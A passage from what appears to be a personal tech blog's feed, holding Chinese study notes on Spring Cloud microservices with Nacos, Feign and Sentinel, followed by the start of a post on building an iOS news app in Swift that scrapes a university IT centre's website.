&#x2F;beans，包含bean依赖关系</p><h3 id="微服务开发要考虑的问题"><a href="#微服务开发要考虑的问题" class="headerlink" title="微服务开发要考虑的问题"></a>微服务开发要考虑的问题</h3><p> 微服务划分，服务粒度、通信协议、接口设计、配置管理、使用事件解耦微服务<br> 服务注册、发现和路由<br> 弹性，负载均衡，断路器模式（熔断），容错<br> 可伸缩（动态增加和缩小自己的实例数）<br> 日志记录和跟踪<br> 安全<br> 构建和部署，基础设施即代码</p><h3 id="微服务划分"><a href="#微服务划分" class="headerlink" title="微服务划分"></a>微服务划分</h3><p> 可以从数据模型入手，每个域的服务只能访问自己的表<br> 刚开始粒度可以大一点，不要太细，由粗粒度重构到细粒度是比较容易的<br> 设计是逐步演化的</p><h3 id="接口的设计"><a href="#接口的设计" class="headerlink" title="接口的设计"></a>接口的设计</h3><p> 使用标准HTTP动词：GET、PUT、POST、DELETE，映射到CRUD<br> 使用URI来传达意图<br> 请求和响应使用JSON<br> 使用HTTP状态码来传达结果</p><h3 id="运维实践"><a href="#运维实践" class="headerlink" title="运维实践*"></a>运维实践*</h3><ul><li>都在源代码库中；</li><li>指定JAR依赖的版本号；</li><li>配置与源代码分开放；</li><li>已构建的服务是不可变的，不能再被修改；</li><li>微服务应该是无状态的，将状态外置，因为 pod 可变化；</li><li>并发，通过启动更多的微服务实例横向扩展，多线程是纵向扩展。</li></ul><h2 id="十一、基于-NACOS-的数据配置"><a href="#十一、基于-NACOS-的数据配置" class="headerlink" title="十一、基于 NACOS 的数据配置"></a>十一、基于 NACOS 的数据配置</h2><h3 id="将服务配置信息与代码分开："><a href="#将服务配置信息与代码分开：" class="headerlink" title="将服务配置信息与代码分开："></a>将服务配置信息与代码分开：</h3><p>属性不能和源代码放在一起：</p><ul><li>属性比较敏感，不希望开发人员可见；</li><li>属性是需要变化的，如测试中使用的数据与生产中使用的数据库不同。</li></ul><p>集中提供配置的方式：</p><p> 配置信息硬编码到代码中<br> 分离的外部属性文件<br> 与物理部署分离，如外部数据库<br> k8s-configmap（为 k8s 中的一种资源）<br> 配置数据作为单独的服务提供</p><h3 id="使用-nacos-进行配置管理的步骤"><a href="#使用-nacos-进行配置管理的步骤" class="headerlink" title="使用 nacos 进行配置管理的步骤*"></a>使用 nacos 进行配置管理的步骤*</h3><blockquote><p>nacos 也是一个软件</p></blockquote><p>更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。</p><ol><li><p>加依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在 bootstrap.yml 中定义 nacos 的访问地址，以及文件的后缀和服务名，用于组合 dataId。</p></li><li><p>使用 @Value(属性名) 获取属性值，使用 @RefreshScope 实现自动刷新。</p></li></ol><h3 id="dataId-的完整格式"><a href="#dataId-的完整格式" class="headerlink" title="dataId 的完整格式"></a>dataId 的完整格式</h3><ul><li>${prefix}-${spring.profiles.active}.${file-extension}</li><li>prefix 默认为 spring.application.name 的值，也可以通过配置项 spring.cloud.nacos.config.prefix来配置</li><li>spring.profiles.active 即为当前环境对应的 profile</li><li>file-exetension 为配置内容的数据格式，可以通过配置项 spring.cloud.nacos.config.file-extension 来配置。</li><li>目前只支持 properties 和 yaml 类型</li></ul><hr><h3 id="curl工具介绍"><a href="#curl工具介绍" class="headerlink" title="curl工具介绍"></a>curl工具介绍</h3><p>k8s部署：kubectl run -i -t –rm&#x3D;true mycurl –image&#x3D;curlimages&#x2F;curl:latest –restart&#x3D;Never –command – sh</p><p>-i -t：交互</p><p>–rm：退出时删除；</p><p>–restart&#x3D;Never：不自动重启；</p><p>–command[0x20]–[0x20]x：在容器启动后直接执行命令 x。</p><p><strong>在 k8s 内部：*</strong></p><p>可以通过服务名加端口访问对应的服务；</p><p>可以通过服务的集群 IP 进行访问；</p><p>可以通过 pod 的 IP 地址进行访问；</p><p>但是 <strong>不可以</strong> 通过 pod 名访问。</p><p>在 spring cloud 中使用 nacos：</p><p>spring.application.name&#x3D;example，微服务开发的服务名</p><p>默认使用服务名作为前缀；</p><p>spring.cloud.nacos.config.file-extension&#x3D;yaml&#x2F;&#x2F; 将后缀指定为 yaml</p><p>spring 框架提供的注解</p><p>使用 @Value 注解进行属性值的注入</p><p>@RefreshScope 自动刷新</p><p>使用 nc 测试端口是否可用</p><h3 id="敏感信息的存储"><a href="#敏感信息的存储" class="headerlink" title="敏感信息的存储"></a>敏感信息的存储</h3><p>对称加密：一个密钥 ；</p><p>非对称加密：公钥和私钥。</p><ol><li><p>加入 rsa 依赖；</p></li><li><p>在微服务容器中添加环境变量：</p><p><img src="https://assets.kekwy.com/images/image-20230409170024989.png" alt="image-20230409170024989"></p><p>加密的口令</p></li></ol><h2 id="十二、基于-NACOS-的服务注册与发现"><a href="#十二、基于-NACOS-的服务注册与发现" class="headerlink" title="十二、基于 NACOS 的服务注册与发现"></a>十二、基于 NACOS 的服务注册与发现</h2><p>nacos 等待一段时间收不到心跳之后（默认 5s）会删除不可用的服务。</p><h3 id="服务发现的好处"><a href="#服务发现的好处" class="headerlink" title="服务发现的好处*"></a>服务发现的好处*</h3><ul><li><p>快速水平伸缩，而不是垂直伸缩。不影响客户端</p><p>水平伸缩：任意增加或减少服务实例数，而客户端无感知，但可随时获取可用信息；</p><p>垂直伸缩：增加主机性能，而不是增加新的实例；</p><p>不影响客户端：客户端不用关心对方的 IP 地址端口号，只需要知道服务名。</p></li><li><p>提高应用程序的弹性：</p><p>系统的可靠性、系统的容错性。</p><p>服务注册与发现的弹性体现在：</p><p>如果五个服务中有个实例挂了，nacos 就不会再提供这个不可用实例的信息给客户端。</p></li></ul><h3 id="Spring-Cloud-Alibaba-子项目"><a href="#Spring-Cloud-Alibaba-子项目" class="headerlink" title="Spring Cloud Alibaba 子项目"></a>Spring Cloud Alibaba 子项目</h3><p>Nacos、Sentinel</p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>客户端对服务进行选择，openfeign loadbalancer，客户端的负载均衡。</p><h3 id="借助-nacos-做服务注册与发现"><a href="#借助-nacos-做服务注册与发现" class="headerlink" title="借助 nacos 做服务注册与发现"></a>借助 nacos 做服务注册与发现</h3><ol><li><p>加入 starter 依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-loadbalancer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-loadbalancer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在 bootstrap 中配置 nacos 的访问地址：</p><p><img src="https://assets.kekwy.com/images/image-20230409175558697.png" alt="image-20230409175558697"></p></li><li><p>在程序入口处（主类 SpringCloudApplication）添加注解：</p><p>@EnableDiscorveryClient</p><p>使用 feign 方式调用远程服务，在启动类上添加注解：</p><p>@EnableFeignClients</p></li><li><p>定义 feign 接口。</p></li></ol><h3 id="调用服务的三种方式"><a href="#调用服务的三种方式" class="headerlink" title="调用服务的三种方式*"></a>调用服务的三种方式*</h3><ul><li>Spring DiscoveryClient</li><li>使用支持 LoadBalanced 的 RestTemplate</li><li>使用OpenFeign（@FeignClient）<ul><li>OpenFeign是一款声明式、模板化的HTTP客户端， Feign可以帮助我们更快捷、优雅地调用HTTP API。</li></ul></li></ul><p>后两者均支持负载均衡。</p><h3 id="有用的命令"><a href="#有用的命令" class="headerlink" title="有用的命令"></a>有用的命令</h3><p> 查看日志：kubectl logs -f -l app&#x3D;organizationservice –all-containers&#x3D;true （将相同服务的日志集中输出）<br> 重部署：kubectl rollout restart deployment organizationservice<br> 扩容：kubectl scale deployment organizationservice –replicas 5</p><h3 id="Feign-方式访问"><a href="#Feign-方式访问" class="headerlink" title="Feign 方式访问*"></a>Feign 方式访问*</h3><blockquote><p>把远程服务的访问抽象成本地方法的调用</p></blockquote><ol><li><p>添加注解 <code>@EnableFeignClients</code>；</p></li><li><p>定义访问接口：</p><p><img src="https://assets.kekwy.com/images/image-20230409181825318.png" alt="image-20230409181825318"></p><p><code>@FeignClient(&quot;服务名&quot;)</code></p></li><li><p>使用 <code>@Autowired</code> 注入 bean；</p></li></ol><h3 id="负载均衡的策略"><a href="#负载均衡的策略" class="headerlink" title="负载均衡的策略"></a>负载均衡的策略</h3><p> roundLoadBalancer<br> randomLoadBalancer<br> @LoadBalancerClient(name &#x3D; “organizationservice”, configuration &#x3D; Application.class)<br> 对第二、三种调用都有效</p><p><img src="https://assets.kekwy.com/images/image-20230409182429654.png" alt="image-20230409182429654"></p><h3 id="健康检查"><a href="#健康检查" class="headerlink" title="健康检查*"></a>健康检查*</h3><ul><li>临时实例的客户端主动上报机制，临时实例每隔 5s 发送一个心跳包给 Nacos 服务器端。（大部分情况）</li><li>永久实例的服务端反向探测机制，永久实例支持 3 种探测协议，TCP、HTTP 和 MySQL，默认探测协议为 TCP，也就是通过不断 ping 的方式来判断实例是否健康。（IP 地址不变，nacos 可以主动探测）</li></ul><p><img src="https://assets.kekwy.com/images/image-20230409182518390.png" alt="image-20230409182518390"></p><h3 id="nacos-的-service-与-kubernetes-的-service-的异同点"><a href="#nacos-的-service-与-kubernetes-的-service-的异同点" class="headerlink" title="nacos 的 service 与 kubernetes 的 service 的异同点"></a>nacos 的 service 与 kubernetes 的 service 的异同点</h3><p>共同点：通过服务名来访问服务，一个服务名的背后可能有多个动态的实例；</p><p>不同点：</p><ul><li><p>kubernetes 中的服务（实现级别的）是 pod 层级的，与 k8s 中的其他资源配合使用；</p></li><li><p>nacos 中的服务（概念性的）是服务层级的，是与开发框架相关的：</p><p>微服务开发之前没有 k8s 也可以使用 spring cloud 定义多个微服务。</p><p>定义了 nacos 的 service 之后就没必要定义 k8s 中的 service 了。</p></li></ul><p>*客户端只是从 nacos 服务器获取目标服务的信息，实际与目标服务通信并不需要 nacos 进行转发。</p><h2 id="十三、基于-Sentinel-的流控与熔断"><a href="#十三、基于-Sentinel-的流控与熔断" class="headerlink" title="十三、基于 Sentinel 的流控与熔断"></a>十三、基于 Sentinel 的流控与熔断</h2><blockquote><p>Sentinel、Nacos</p></blockquote><h3 id="什么是流控与熔断"><a href="#什么是流控与熔断" class="headerlink" title="什么是流控与熔断"></a>什么是流控与熔断</h3><blockquote><p>避免雪崩效应：一级一级拖垮系统效率</p></blockquote><p>流控：</p><p>如果客户端发出的请求过多导致服务端不能及时处理（A到B的请求被称为流量），限制A到B的流量，超过一定的数量服务端就不作处理。避免服务端高负荷工作和对某个客户端请求的处理时间过长。</p><p>容错：</p><p>需要一个错误处理服务器对服务抛出的错误进行处理。</p><p>熔断：</p><p>如果客户端发往服务端的每一个请求响应都非常慢，则可以认为服务端正在高负荷运转或内部已经出现了错误，此时客户端就不会再等到该服务端的请求，或不再将请求发往该服务端，直接认为该服务出错。</p><h3 id="Sentinel"><a href="#Sentinel" class="headerlink" title="Sentinel"></a>Sentinel</h3><p>控制台不需要我们进行开发，我们只需要针对核心库进行开发。</p><p><img src="https://assets.kekwy.com/images/image-20230409235230386.png" alt="image-20230409235230386"></p><p>控制台不负责维护规则，规则从服务中查来；</p><p>服务挂，规则丢；</p><p>控制台定义的规则直接应用到服务上。</p><p>定义资源 -&gt; 定义规则 -&gt; 查看效果</p><h3 id="定义资源"><a href="#定义资源" class="headerlink" title="定义资源"></a>定义资源</h3><ul><li>代码直接定义；</li><li>使用注解定义；</li><li>基于 Spring Cloud 针对 url 自动定义。</li></ul><p>外置的文件只能用于定义规则而不能用于定义资源。</p><h3 id="规则的种类"><a href="#规则的种类" class="headerlink" title="规则的种类"></a>规则的种类</h3><ul><li>流量控制规则；</li><li>熔断降级规则；</li><li>系统保护规则；</li><li>来源访问控制规则；</li><li>热点参数规则。</li></ul><h3 id="熔断策略"><a href="#熔断策略" class="headerlink" title="熔断策略"></a>熔断策略</h3><p>慢调用比例；</p><p>异常比例；</p><p>异常数。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;服务端开发-复习大纲&quot;&gt;&lt;a href=&quot;#服务端开发-复习大纲&quot; class=&quot;headerlink&quot; title=&quot;服务端开发 复习大纲&quot;&gt;&lt;/a&gt;服务端开发 复习大纲&lt;/h1&gt;&lt;h2 id=&quot;一、建立开发环境&quot;&gt;&lt;a href=&quot;#一、建立开发环境&quot; cla</summary>
      
    
    
    
    <category term="服务端开发" scheme="http://blog.kekwy.com/categories/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Java" scheme="http://blog.kekwy.com/tags/Java/"/>
    
    <category term="软件工程" scheme="http://blog.kekwy.com/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="Spring" scheme="http://blog.kekwy.com/tags/Spring/"/>
    
    <category term="后端" scheme="http://blog.kekwy.com/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>【iOS开发】IW2 新闻APP</title>
    <link href="http://blog.kekwy.com/iw2-newsapp/"/>
    <id>http://blog.kekwy.com/iw2-newsapp/</id>
    <published>2022-11-28T10:02:55.000Z</published>
    <updated>2023-01-28T10:03:25.388Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="mailto:&#107;&#x65;&#x65;&#x6b;&#x6b;&#101;&#x77;&#121;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;">&#107;&#x65;&#x65;&#x6b;&#x6b;&#101;&#x77;&#121;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;</a></p></blockquote><ul><li><a href="#%E7%AE%80%E4%BB%8B">简介</a><ul><li><a href="#%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D">功能介绍</a></li><li><a href="#%E5%B1%95%E7%A4%BA%E8%A7%86%E9%A2%91">展示视频</a></li></ul></li><li><a href="#%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0">技术实现</a><ul><li><a href="#%E8%A7%86%E5%9B%BE%E7%BB%93%E6%9E%84">视图结构</a></li><li><a href="#%E5%86%85%E5%AE%B9%E7%9B%AE%E5%BD%95%E9%A1%B5">内容目录页</a><ul><li><a href="#%E7%9B%AE%E5%BD%95%E5%86%85%E5%AE%B9%E6%8A%93%E5%8F%96">目录内容抓取</a></li><li><a href="#%E7%9B%AE%E5%BD%95%E5%86%85%E5%AE%B9%E6%98%BE%E7%A4%BA">目录内容显示</a></li><li><a href="#%E4%B8%8B%E6%8B%89%E5%92%8C%E4%B8%8A%E6%8B%89%E5%88%B7%E6%96%B0">下拉和上拉刷新</a></li><li><a href="#%E7%95%8C%E9%9D%A2%E8%B7%B3%E8%BD%AC">界面跳转</a></li></ul></li><li><a href="#%E6%96%87%E7%AB%A0%E8%AF%A6%E6%83%85%E9%A1%B5">文章详情页</a><ul><li><a href="#%E5%86%85%E5%AE%B9%E5%8A%A0%E8%BD%BD">内容加载</a></li><li><a href="#%E5%AF%BC%E8%88%AA%E6%A0%8F%E7%9A%84%E9%9A%90%E8%97%8F%E5%92%8C%E6%98%BE%E7%A4%BA">导航栏的隐藏和显示</a></li></ul></li><li><a href="#%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC%E9%A1%B5">关于我们页</a></li></ul></li><li><a href="#%E6%84%9F%E8%B0%A2%E8%AF%84%E9%98%85">感谢评阅</a></li></ul><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h3><p>该APP是为学校信息中心（ITSC）官网设计的一个新闻客户端，包含“新闻动态”、”通知公告“、”信息化动态“、“安全公告”、“关于我们”五个板块，实时从官网上抓取新闻，支持上拉刷新，下拉加载新内容，异步加载图片和对图片、文字进行本地缓存等功能。</p><h3 id="展示视频"><a href="#展示视频" class="headerlink" title="展示视频"></a>展示视频</h3><p><a href="https://www.bilibili.com/video/BV1TY411Z7PY/"><img src="https://assets.kekwy.com/images/image-20230127165801212.png" alt="image-20230127165801212"></a></p><h2 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h2><h3 id="视图结构"><a href="#视图结构" class="headerlink" title="视图结构"></a>视图结构</h3><img src="https://assets.kekwy.com/images/image-20230127170711886.png" alt="image-20230127170711886" style="zoom:67%;" /><h3 id="内容目录页"><a href="#内容目录页" class="headerlink" title="内容目录页"></a>内容目录页</h3><blockquote><p>每个板块使用 TableView 组织内容，没个 cell 展示一则新闻的标题和发布时间。用户点击 cell 时根据此时 cell中的内容跳转至对应新闻的详情页。</p></blockquote><h4 id="目录内容抓取"><a href="#目录内容抓取" class="headerlink" title="目录内容抓取"></a>目录内容抓取</h4><p><strong>初始化 url</strong></p><p>在目录页的 TableViewController 初始化时，根据该页面导航栏的标题设置该页面板块所对应的 url 前缀。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">required</span> <span class="keyword">init?</span>(<span class="params">coder</span>: <span class="type">NSCoder</span>) &#123;</span><br><span class="line">   url <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">   receivedData <span class="operator">=</span> <span class="type">Data</span>()</span><br><span class="line">   <span class="keyword">super</span>.<span class="keyword">init</span>(coder: coder)</span><br><span class="line">   <span class="keyword">switch</span>(navigationItem.title) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;新闻动态&quot;</span>:</span><br><span class="line">         url <span class="operator">=</span> <span class="string">&quot;https://itsc.nju.edu.cn/xwdt/list&quot;</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;通知公告&quot;</span>:</span><br><span class="line">         url <span class="operator">=</span> <span class="string">&quot;https://itsc.nju.edu.cn/tzgg/list&quot;</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;信息化动态&quot;</span>:</span><br><span class="line">         url <span class="operator">=</span> <span class="string">&quot;https://itsc.nju.edu.cn/wlyxqk/list&quot;</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;安全公告&quot;</span>:</span><br><span class="line">         url <span class="operator">=</span> <span class="string">&quot;https://itsc.nju.edu.cn/aqtg/list&quot;</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">break</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>发送 url 请求</strong></p><p>定义 session 用于发送和处理网络请求：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">lazy</span> <span class="keyword">var</span> session: <span class="type">URLSession</span> <span class="operator">=</span> &#123;</span><br><span class="line">   <span class="keyword">let</span> configuration <span class="operator">=</span> <span class="type">URLSessionConfiguration</span>.default</span><br><span class="line">   configuration.waitsForConnectivity <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line">   configuration.timeoutIntervalForResource <span class="operator">=</span> <span class="number">300</span></span><br><span class="line">   <span class="comment">// 将缓存策略设置为从不使用缓存</span></span><br><span class="line">   configuration.requestCachePolicy <span class="operator">=</span> .reloadIgnoringLocalCacheData</span><br><span class="line">   <span class="keyword">return</span> <span class="type">URLSession</span>(configuration: configuration, delegate: <span class="keyword">self</span>, delegateQueue: <span class="literal">nil</span>)</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>由于每次启动 APP 时应获取实时的新闻列表，故此处将 session 设置为不使用缓存。</p><p>将 url 前缀后直接加上 “.htm” 组成 itsc 对应板块文章列表第一页的 url 地址，在后台线程队列 requestQueue 中发起 urlRequest：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">requestQueue.async &#123;</span><br><span class="line">   <span class="keyword">let</span> curUrl <span class="operator">=</span> <span class="type">URL</span>(string: <span class="keyword">self</span>.url <span class="operator">+</span> <span class="string">&quot;.htm&quot;</span>)</span><br><span class="line">   <span class="keyword">let</span> task <span class="operator">=</span> <span class="keyword">self</span>.session.dataTask(with: <span class="type">URLRequest</span>(url: curUrl<span class="operator">!</span>))</span><br><span class="line">   <span class="keyword">self</span>.refreshTaskId <span class="operator">=</span> task.taskIdentifier</span><br><span class="line">   task.resume()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>处理返回结果</strong></p><p>在定义 session 时将当前 ViewController 设置为了其代理，故在当前 ViewController 中实现代理方法，并定义 receivedData 变量储存返回内容直到回复内容全部返回：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> receivedData: <span class="type">Data</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">func</span> <span class="title function_">urlSession</span>(<span class="keyword">_</span> <span class="params">session</span>: <span class="type">URLSession</span>, <span class="params">dataTask</span>: <span class="type">URLSessionDataTask</span>, <span class="params">didReceive</span> <span class="params">response</span>: <span class="type">URLResponse</span>, <span class="params">completionHandler</span>: <span class="keyword">@escaping</span> (<span class="type">URLSession</span>.<span class="type">ResponseDisposition</span>) -&gt; <span class="type">Void</span>) &#123;</span><br><span class="line">   <span class="operator">...</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">func</span> <span class="title function_">urlSession</span>(<span class="keyword">_</span> <span class="params">session</span>: <span class="type">URLSession</span>, <span class="params">dataTask</span>: <span class="type">URLSessionDataTask</span>, <span class="params">didReceive</span> <span class="params">data</span>: <span class="type">Data</span>) &#123;</span><br><span class="line">   <span class="keyword">self</span>.receivedData.append(data)</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">func</span> <span class="title function_">urlSession</span>(<span class="keyword">_</span> <span class="params">session</span>: <span class="type">URLSession</span>, <span class="params">task</span>: <span class="type">URLSessionTask</span>, <span class="params">didCompleteWithError</span> <span class="params">error</span>: <span class="type">Error</span>?) &#123;</span><br><span class="line">   <span class="operator">...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 scanner 根据 itsc 官网源码的格式对得到的 html 代码进行解析，从中获取每条新闻的标题、日期、正文 url以及建立三者的对应关系。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> string <span class="operator">=</span> <span class="type">String</span>(data: <span class="keyword">self</span>.receivedData, encoding: .utf8)</span><br><span class="line"><span class="keyword">let</span> contentScanner <span class="operator">=</span> <span class="type">Scanner</span>(string: string<span class="operator">!</span>)</span><br><span class="line"><span class="keyword">_</span> <span class="operator">=</span> contentScanner.scanUpToString(<span class="string">&quot;&lt;div id=<span class="subst">\&quot;</span>wp_news_w6<span class="subst">\&quot;</span>&gt;&quot;</span>)</span><br><span class="line"><span class="operator">...</span></span><br></pre></td></tr></table></figure><h4 id="目录内容显示"><a href="#目录内容显示" class="headerlink" title="目录内容显示"></a>目录内容显示</h4><p><strong>自定义 TableViewCell</strong></p><p>自定义 ArticleTableViewCell 类，并在 TableViewController 中注册：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">self</span>.tableView.register(<span class="type">ArticleTableViewCell</span>.<span class="keyword">self</span>, forCellReuseIdentifier: <span class="string">&quot;myCell&quot;</span>)</span><br></pre></td></tr></table></figure><p>ArticleTableViewCell 中包含两个 UILabel，一个用于显示文章标题，另一个用于显示文章日期，还有一个字符串变量保存该文章的正文 url。</p><p>其中的所有控件在初始化时通过代码设置约束，每一个 cell 在加载标题前拥有默认高度，成功设置文章标题后其高度跟随标题 UILabel。</p><p><strong>设置 cell 内容</strong></p><p>在 TableViewController 中实现代理方法：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="keyword">func</span> <span class="title function_">tableView</span>(<span class="keyword">_</span> <span class="params">tableView</span>: <span class="type">UITableView</span>, <span class="params">cellForRowAt</span> <span class="params">indexPath</span>: <span class="type">IndexPath</span>) -&gt; <span class="type">UITableViewCell</span> &#123;</span><br><span class="line">   <span class="keyword">let</span> cell <span class="operator">=</span> tableView.dequeueReusableCell(withIdentifier: <span class="string">&quot;myCell&quot;</span>, for: indexPath)</span><br><span class="line">   <span class="keyword">if</span> indexPath.row <span class="operator">&lt;</span> <span class="keyword">self</span>.cellData.count &#123;</span><br><span class="line">      <span class="keyword">let</span> text <span class="operator">=</span> cellData[indexPath.row]</span><br><span class="line">      (cell <span class="keyword">as!</span> <span class="type">ArticleTableViewCell</span>).setContent(link: text[<span class="number">0</span>], title: text[<span class="number">1</span>], date: text[<span class="number">2</span>])</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">return</span> cell</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用此前注册的信息创建一个 cell，根据即将显示的 cell 所在的行号获取对应的数据，并对其内容进行设置。</p><p>在 TableViewController 定义变量 cellData：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span 